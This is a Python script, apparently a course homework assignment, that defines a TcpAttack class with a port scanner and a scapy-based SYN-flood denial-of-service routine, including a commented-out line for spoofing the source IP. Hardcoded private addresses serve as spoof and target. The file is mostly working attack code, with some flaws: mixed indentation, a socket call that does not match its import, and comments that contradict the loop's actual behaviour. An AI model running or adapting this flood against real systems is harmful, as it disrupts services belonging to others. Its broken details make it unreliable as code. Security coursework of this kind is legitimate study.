#!/usr/bin/python
import sys
sys.path.append( "/home/shay/a/kalita/ece404/HW7/BitVector-3.3.2" )
from BitVector import *
import string
import math
from socket import *
from scapy.all import *

class TcpAttack: #the TcpAttack class definition
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP #assign spoof IP
        self.targetIP = targetIP #assign target IP
    
    def scanTarget(self, rangeStart, rangeEnd):#function to check for open ports
        fo = open('openports.txt', 'w') #output file for writing
        for i in range(rangeStart, rangeEnd + 1): #check for all ports in range
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
            sock.settimeout(1) #create a socket time out of 1 s so as to wait indefinitely on a closed port, set it before connection is established
            connect = sock.connect_ex((self.targetIP, i)) #connect to targetIP at each port in the range given
            if connect == 0: #the port i is open
                fo.write(str(i) + '\n') #write the name of the port in output file
                print('Port ' + str(i) + ' is open.')
                sock.close()
            #sock.shutdown(SHUT_RDWR)
            sock.close() #shutdown and close will close the socket in a timely fashion, free up resources as soon as the connection is closed
    
    def attackTarget(self, port):#function to attack the target
	i = 0        
	while (i <= 50): #keep sending infinite SYN packets to mount DoS attck
	    i = i + 1	
            sr1(IP(dst = self.targetIP)/TCP(dport = port, flags="S")) #send a SYN flood attack from your machine
            #sr1(IP(src = self.spoofIP, dst = self.targetIP)/TCP(dport = port, flags="S"))  #send a SYN packet from the spoofIP to targetIP to mount DoS on targetIP
		
#127.0.1.1		
spoofIP = '192.168.93.82'
targetIP = '192.168.75.228'
obj = TcpAttack(spoofIP, targetIP)
rangeStart = 200
rangeEnd = 1000
obj.attackTarget(300)
obj.scanTarget(rangeStart, rangeEnd)
#obj.attackTarget(300)

            
        
